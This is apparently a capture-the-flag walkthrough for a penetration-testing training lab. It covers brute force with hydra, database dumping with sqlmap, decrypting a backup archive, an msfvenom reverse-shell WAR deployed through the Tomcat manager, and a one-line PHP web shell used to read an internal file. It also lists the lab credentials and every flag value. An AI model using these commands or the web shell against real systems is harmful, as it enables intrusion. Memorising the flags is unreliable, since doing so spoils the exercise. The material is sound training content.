# VAPT Lab Instructions

## Participant Portal Access
- **URL:** http://192.168.5.150/login/
- **Credentials:** `kali` / `P@ssw0rd@1`

> **Note:** Once you find the flags, open the participant portal, click on **Submit +** button to submit the solution. After submitting all the flags of the Stage, click on **Verify Stage** to check whether your answers are right. You will be able to proceed to Stage 2 only if you complete Stage 1. Once you come to the last stage, then only you select **Complete** button. If you select **Complete** button while you're in Stage 1, your test will be closed.

---

## Scenario 1: Brute Force

**Step 1:** Open a Firefox browser in your assigned VAPT machine and access the victim IP:
```
http://192.168.5.167
```

**Step 2:** Type the below command in the VAPT terminal:
```bash
hydra -l admin -P /usr/share/wordlist/rockyou.txt 172.22.1.167 http-post-form "/login.php:username=^USER^&password=^PASS^:S=dashboard.php" -V -f
```
> We have successfully brute-forced it and we have got the credentials: `admin` / `purple1`

**Step 3:** Come back to the browser you had opened earlier in Firefox, and give the credentials here which you got in Step 2. After that, click on **Access Workspace**.

**Step 4:** Scroll down the website and you will notice that we have identified our first flag.

**Flag 1:**
```
FLAG1{BRUTE_FORCE_ADMIN_PURPLE1_LOGIN}
```

**Step 5:** Sign out of the website once you get the flag.

---

## Scenario 2: SQL Injection

**Step 1:** Open another terminal and type the below command:
```bash
sqlmap -u "http://192.168.5.167/login.php" --data="username=admin&password=purple1" -p username --batch --current-db
```

**Step 2:** Scroll down and you will notice that we have got DB details. Now we will find the DB tables in the next step.

**Step 3:** Type the below command:
```bash
sqlmap -u "http://192.168.5.167/login.php" --data="username=admin&password=purple1" -p username --batch -D campus_ops --tables
```

**Step 4:** We have got the tables. Our main focus now should be on the table named `users`.

**Step 5:** Now inside the user's table, we are extracting the column names. Type the below command to get the column:
```bash
sqlmap -u "http://192.168.5.167/login.php" --data="username=admin&password=purple1" -p username --batch -D campus_ops -T users -C user --dump
```
> We have got our second flag.

**Flag 2:**
```
FLAG2{SQLMAP_DUMPED_USER_FIELD_FROM_DATABASE}
```

---

## Scenario 3: Ransomware Encryption

**Step 1:** Open browser, access the URL http://192.168.5.167 and enter the credentials which you had earlier received: `admin` / `purple1`

**Step 2:** Once you get the webpage, click on **System Archives**.

**Step 3:** You will get the following directories; we will download both the files in the VAPT terminal using `wget` command.

**Step 4:** Open the VAPT terminal, and type the below commands:
```bash
wget http://192.168.5.167/backup/campus_archive_2026_05_31.enc
wget http://172.22.1.167/backup/vault.key
```

**Step 5:** Then type the OpenSSL command to decrypt the `.enc` file:
```bash
openssl enc -d -aes-256-cbc -pbkdf2 -in campus_archive_2026_05_31.enc -out restored.txt -pass file:vault.key
```
> We have got our third flag.

**Flag 3:**
```
FLAG3{DIRECTORY_BACKUP_ARCHIVE_DECRYPTED}
```

---

## Scenario 4: Apache Tomcat RCE

**Step 1:** Come back to the homepage of `192.168.5.167`, click on **Application Console**; you will get an Apache Tomcat page.

**Step 2:** After that, click on **Manager App**, and a pop-up box will appear. Give the credentials: `admin` / `purple1`

**Step 3:** Open the VAPT terminal, and check your IP of `192.168.5.X` series.

**Step 4:** Run a listener in the assigned VAPT terminal.

**Step 5:** Open another terminal and type the below command to create a malicious WAR file payload for a Java/Tomcat server. When the WAR file is uploaded and executed on Tomcat, it tries to connect back to your Kali machine and give you a reverse shell:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.5.X LPORT=4444 -f war -o shell.war
```

**Step 6:** Click on the **Browse** button to upload the created WAR file.

**Step 7:** Go to the path where you have saved the WAR file, select the file. You can give your unique WAR file name.

**Step 8:** Click on **Deploy**.

**Step 9:** Click on the deployed shell.

**Step 10:** Go to the terminal where you had run the listener, and we have got the reverse shell. Type the below commands to get the fourth flag:
```bash
ls
cat flag.txt
```

**Flag 4:**
```
FLAG4{TOMCAT_MANAGER_WAR_REVERSE_SHELL_ACCESS}
```

---

## Scenario 5: File Upload Vulnerability

**Step 1:** Type the below command:
```bash
sudo nano cmd.php
```
> It will ask for root password; type: `P@ssw0rd@1`

**Step 2:** Type the below text inside the `cmd.php` file:
```php
<?php system($_GET['cmd']); ?>
```

**Step 3:** Open the Firefox browser, again in a new tab, visit the homepage of `http://192.168.5.167`, click on **Document Intake**.

**Step 4:** Go to the path where you had saved the `cmd.php` file.

**Step 5:** Click on **Submit Document**, and after clicking on it, you will get a notification at the bottom of the page: `/var/www/internal/.service_cache`

**Step 6:** Post that, click on the storage path as shown in the screenshot.

**Step 7:** You will get the following image; you will type the further commands in front of the highlighted box.

**Step 8:** Type the below command in the URL:
```
http://192.168.5.167/storage/uploads/cmd.php?cmd=cat /var/www/internal/.service_cache
```
> We have got our fifth flag.

**Flag 5:**
```
FLAG5{FILE_UPLOAD_READ_INTERNAL_SERVICE_CACHE}
```

---

## Scenario 6: APT32 Log Decryption

**Step 1:** Open a Firefox browser, and visit the homepage of the URL `http://192.168.5.167`, and click on **Endpoint Events**. Scroll down and at the bottom you will notice a source named `proxy01`; there is an event named `session metadata` which is in the format of base64 log. Copy the code.

**Step 2:** Open a new terminal, and type the below command:
```bash
echo -n "copied base64 code" | base64 -d
```
> We have got our sixth flag.

**Flag 6:**
```
FLAG6{APT32_INTRUSION_THREAD_DECODED}
```
